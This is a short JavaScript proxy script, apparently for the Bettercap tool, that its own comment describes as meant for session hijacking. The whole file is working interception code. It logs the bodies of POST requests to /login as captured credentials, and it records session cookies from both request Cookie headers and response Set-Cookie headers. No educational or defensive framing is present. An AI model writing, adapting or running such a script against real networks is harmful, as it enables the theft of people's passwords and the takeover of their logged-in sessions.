// Bettercap HTTP proxy script for session hijacking
function onRequest(req, res) {
    if (req.Method == "POST" && req.Path == "/login") {
        console.log("=== CAPTURED CREDENTIALS ===");
        console.log(req.Body);
    }
    // Extract session cookies from request
    if (req.HasHeader("Cookie")) {
        console.log("Session Cookie (Request): " + req.GetHeader("Cookie"));
    }
}

function onResponse(req, res) {
    if (res.HasHeader("Set-Cookie")) {
        console.log("New Session Cookie (Response): " + res.GetHeader("Set-Cookie"));
    }
}
